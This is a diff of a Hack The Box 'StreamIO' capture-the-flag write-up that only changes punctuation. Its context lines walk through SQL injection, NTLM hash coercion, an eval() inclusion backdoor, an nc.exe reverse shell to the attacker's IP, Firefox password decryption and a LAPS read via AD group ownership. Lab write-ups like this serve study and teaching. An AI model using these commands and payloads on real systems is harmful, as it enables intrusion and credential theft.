@@ -8,7 +8,7 @@ draft: false
 ---
 
 
-Windows AD box with a PHP streaming site on HTTPS. The attack chain is unusually web-heavy for an HTB Active Directory box: you spend more time in Burp than in evil-winrm before the domain even becomes relevant. The interesting part isn't any single vulnerability - it's how a SQL injection on one subdomain eventually feeds into an eval() backdoor on another, and how Firefox's credential store hands over an AD account with a path nobody mentions until you look at it in BloodHound.
+Windows AD box with a PHP streaming site on HTTPS. The attack chain is unusually web-heavy for an HTB Active Directory box: you spend more time in Burp than in evil-winrm before the domain even becomes relevant. The interesting part isn't any single vulnerability. It's how a SQL injection on one subdomain eventually feeds into an eval() backdoor on another, and how Firefox's credential store hands over an AD account with a path nobody mentions until you look at it in BloodHound.
 
 ## Recon
 
@@ -55,7 +55,7 @@ The main site at `streamIO.htb` was a movie streaming platform. The footer had a
 
 ![streamio.htb footer showing staff members Barry, Oliver, and Samantha with their roles](/images/writeups/htb-streamio/web-streamio-staff-section.png)
 
-I generated username variants and tried AS-REP roasting against all of them. Every account came back `KDC_ERR_C_PRINCIPAL_UNKNOWN` - these names don't exist as AD accounts:
+I generated username variants and tried AS-REP roasting against all of them. Every account came back `KDC_ERR_C_PRINCIPAL_UNKNOWN`. These names don't exist as AD accounts:
 
 ```bash
 …/htb/streamIO ✗ GetNPUsers.py streamIO.htb/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip 10.129.11.215
@@ -102,7 +102,7 @@ There was an email form on the main watch page. SQLMap against that `email` para
 [*] ending @ 03:22:04 /2026-06-03/
 ```
 
-Fuzzing found a `/search.php` endpoint. SQLMap triggered the site's blocking mechanism almost immediately - each automated request redirected to `blocked.php` with an access denied page:
+Fuzzing found a `/search.php` endpoint. SQLMap triggered the site's blocking mechanism almost immediately. Each automated request redirected to `blocked.php` with an access denied page:
 
 ```bash
 …/htb/streamIO ✗ sqlmap -r search_req 
@@ -122,9 +122,9 @@ Manual injection worked fine though. Injecting a single quote into the `q` param
 
 ![Burp Suite showing POST to search.php with SQLi payload and MSSQL error response in the orange-highlighted box](/images/writeups/htb-streamio/web-search-sqli-mssql-error.png)
 
-In a union-based injection, you append a `UNION SELECT` to the original query so the database returns rows from a table you choose. The number of columns in your injected SELECT has to match the original query's column count - six columns here, determined by incrementing until the injection stopped erroring.
+In a union-based injection, you append a `UNION SELECT` to the original query so the database returns rows from a table you choose. The number of columns in your injected SELECT has to match the original query's column count, six columns here, determined by incrementing until the injection stopped erroring.
 
-I also tried coercing the SQL service's NTLMv2 hash via `xp_dirtree` pointing at a Responder listener. That worked - but the hash belonged to the `DC$` machine account, not a user account:
+I also tried coercing the SQL service's NTLMv2 hash via `xp_dirtree` pointing at a Responder listener. That worked, but the hash belonged to the `DC$` machine account, not a user account:
 
 ```
 [SMB] NTLMv2-SSP Client   : ::ffff:10.10.11.158
@@ -213,7 +213,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-06-03 05:14:
 
 ![streamio.htb admin panel showing User management, Staff management, Movie management, and Leave a message for admin options](/images/writeups/htb-streamio/web-admin-panel-logged-in.png)
 
-Each button in the admin panel appended a query parameter: `?user=`, `?staff=`, `?movie=`. Fuzzing for additional parameters with a valid session cookie found a `debug` parameter. Testing `?debug=master.php` loaded the Movie management page - so `debug` was feeding a filename into `include()` server-side.
+Each button in the admin panel appended a query parameter: `?user=`, `?staff=`, `?movie=`. Fuzzing for additional parameters with a valid session cookie found a `debug` parameter. Testing `?debug=master.php` loaded the Movie management page, so `debug` was feeding a filename into `include()` server-side.
 
 ```bash
 …/htb/streamIO ❯ ffuf -u "https://streamio.htb/admin/index.php?FUZZ=master.php" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -H "Cookie: PHPSESSID=fflo9cp8c2nkda0rq73klq9cfs" -fw 85
@@ -227,7 +227,7 @@ user                    [Status: 200, Size: 2444, Words: 206, Lines: 75, Duratio
 
 The next question was whether it could load a remote URL instead of a local path. Remote File Inclusion works when PHP's `allow_url_include` is enabled. If `include()` accepts URLs, pointing it at a file on my machine would make the PHP server fetch my file and execute it.
 
-Before testing blind, I used it to read the server's own source code first - pointing `include` at the local `master.php` path to leak it:
+Before testing blind, I used it to read the server's own source code first, pointing `include` at the local `master.php` path to leak it:
 
 ![Burp Suite POST request with include parameter pointing to master.php, response showing PHP source code with eval(file_get_contents($_POST['include'])) highlighted](/images/writeups/htb-streamio/web-rfi-master-php-source-code.png)
 
@@ -243,7 +243,7 @@ echo(" ---- ERROR ---- ");
 }
 ```
 
-`eval(file_get_contents($_POST['include']))` - it fetches whatever URL or path you pass in the `include` POST parameter and evaluates it as PHP. This is full RCE: serve a PHP file with `system()` calls from a local HTTP server, and the box will fetch and execute it. The only restriction is that `index.php` is blocked by name check.
+`eval(file_get_contents($_POST['include']))`. It fetches whatever URL or path you pass in the `include` POST parameter and evaluates it as PHP. This is full RCE: serve a PHP file with `system()` calls from a local HTTP server, and the box will fetch and execute it. The only restriction is that `index.php` is blocked by name check.
 
 Source code also leaked the database credentials: `db_admin:B1@hx31234567890`.
 
@@ -292,7 +292,7 @@ system("nc.exe 10.10.16.129 9999 -e cmd.exe");
                8 Dir(s)   7,176,941,568 bytes free
 ```
 
-Shell as `yoshihide`. `whoami /all` confirmed this is the IIS application pool account - equivalent to `www-data` on Linux:
+Shell as `yoshihide`. `whoami /all` confirmed this is the IIS application pool account, equivalent to `www-data` on Linux:
 
 ```bash
 whoami /all
@@ -334,7 +334,7 @@ No interesting privileges, no access to other users' directories.
 
 ## Lateral Movement to nikk37
 
-`C:\Users\` showed Administrator, Martin, nikk37, and Public. `yoshihide` wasn't there - the web account doesn't have a home directory.
+`C:\Users\` showed Administrator, Martin, nikk37, and Public. `yoshihide` wasn't there. The web account doesn't have a home directory.
 
 The database credentials from the source code were usable. `sqlcmd` from the shell:
 
@@ -352,7 +352,7 @@ streamio_backup
 (6 rows affected)
 ```
 
-Six databases, including one that wasn't in the original enumeration: `streamio_backup`. Same schema as the main database - movies and users tables:
+Six databases, including one that wasn't in the original enumeration: `streamio_backup`. Same schema as the main database, movies and users tables:
 
 ```bash
 C:\inetpub\streamio.htb>sqlcmd -S localhost -U db_admin -P "B1@hx31234567890" -d streamio_backup -Q "SELECT table_name FROM information_schema.tables"
@@ -402,7 +402,7 @@ nikk37's `whoami /all` showed nothing interesting privilege-wise. Uploaded Sharp
     [x] IO exception, places.sqlite file likely in use (i.e. Firefox is likely running).
 ```
 
-Firefox stores saved passwords using symmetric encryption. The encryption key is derived from the master password - if no master password is set, the key derivation uses a blank string, which means any tool with the right logic can decrypt the credentials without cracking anything. The credentials themselves are in `logins.json`, the key material in `key4.db`, and the certificate database in `cert9.db`. Downloaded all three, then ran them through firepwd:
+Firefox stores saved passwords using symmetric encryption. The encryption key is derived from the master password. If no master password is set, the key derivation uses a blank string, which means any tool with the right logic can decrypt the credentials without cracking anything. The credentials themselves are in `logins.json`, the key material in `key4.db`, and the certificate database in `cert9.db`. Downloaded all three, then ran them through firepwd:
 
 ```bash
 …/streamIO/firefox ❯ python3 firepwd/firepwd.py -d .
@@ -480,7 +480,7 @@ BloodHound had already shown what JDgodd could do:
 
 `JDgodd → Owns Core Staff → Core Staff → ReadLAPSPassword → DC`.
 
-JDgodd owns the Core Staff group object. In AD, the owner of an object controls its DACL - the list of who has what permissions on the object. Ownership alone doesn't grant membership, but it does let you modify the group's access control entries. That means JDgodd can grant himself WriteMember rights on the group, then add himself as a member, which puts him in a group with ReadLAPSPassword access to the DC's computer object.
+JDgodd owns the Core Staff group object. In AD, the owner of an object controls its DACL, the list of who has what permissions on the object. Ownership alone doesn't grant membership, but it does let you modify the group's access control entries. That means JDgodd can grant himself WriteMember rights on the group, then add himself as a member, which puts him in a group with ReadLAPSPassword access to the DC's computer object.
 
 LAPS stores the DC's local Administrator password as the `ms-Mcs-AdmPwd` attribute on the computer object in AD. Any member of a group with ReadLAPSPassword access can query that attribute and read the current password directly.
 
